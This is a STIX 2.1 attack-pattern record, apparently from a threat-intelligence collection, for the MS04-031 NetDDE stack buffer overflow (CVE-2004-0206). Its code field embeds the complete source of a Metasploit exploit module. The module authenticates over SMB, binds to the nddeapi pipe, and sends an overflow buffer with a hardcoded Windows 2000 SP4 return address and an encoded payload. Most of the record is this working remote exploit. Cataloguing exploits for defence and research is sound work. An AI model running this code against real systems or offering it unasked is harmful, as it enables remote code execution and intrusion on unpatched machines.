{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f79ea18-d0e1-4af3-a18d-a45d7d482994",
    "created": "2024-08-14T16:56:14.505698Z",
    "modified": "2024-08-14T16:56:14.505702Z",
    "name": "MS04-031 Microsoft NetDDE Service Overflow",
    "description": " This module exploits a stack buffer overflow in the NetDDE service, which is the precursor to the DCOM interface.  This exploit effects only operating systems released prior to Windows XP SP1 (2000 SP4, XP SP0). Despite Microsoft's claim that this vulnerability can be exploited without authentication, the NDDEAPI pipe is only accessible after successful authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms04_031_netdde.rb",
            "external_id": "ms04_031_netdde.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0206"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS04-031 Microsoft NetDDE Service Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the NetDDE service, which is the\n        precursor to the DCOM interface.  This exploit effects only operating systems\n        released prior to Windows XP SP1 (2000 SP4, XP SP0). Despite Microsoft's claim\n        that this vulnerability can be exploited without authentication, the NDDEAPI\n        pipe is only accessible after successful authentication.\n      },\n      'Author'         => [ 'pusscat' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0206'],\n          [ 'OSVDB', '10689'],\n          [ 'BID', '11372'],\n          [ 'MSB', 'MS04-031'],\n\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Payload'        =>\n        {\n          'Space'    => (0x600 - (133*4) - 4),\n          'BadChars' => \"\\\\/.:$\\x00\",       # \\ / . : $ NULL\n          'Prepend'  => 'A' * 8,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4', { 'Ret' => 0x77e56f43 } ],  # push esp, ret :)\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2004-10-12'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (nddeapi)\", 'nddeapi']),\n      ])\n  end\n\n  def exploit\n    connect()\n    smb_login()\n    print_status(\"Trying target #{target.name}...\")\n\n    handle = dcerpc_handle('2f5f3220-c126-1076-b549-074d078619da', '1.2', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n    print_status(\"Binding to #{handle}\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle}\")\n\n    retOverWrite =\n      'AA' + (NDR.long(target.ret) * 133) + payload.encoded\n\n    overflowChunk =\n      retOverWrite +\n      NDR.long(0xCA7CA7) + # Mew. 3 bytes enter. 1 byte null.\n      NDR.long(0x0)\n\n    stubdata =\n      NDR.UnicodeConformantVaryingStringPreBuilt(overflowChunk) +\n      NDR.long(rand(0xFFFFFFFF))\n\n    print_status('Calling the vulnerable function...')\n\n    begin\n      response = dcerpc.call(0xc, stubdata)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}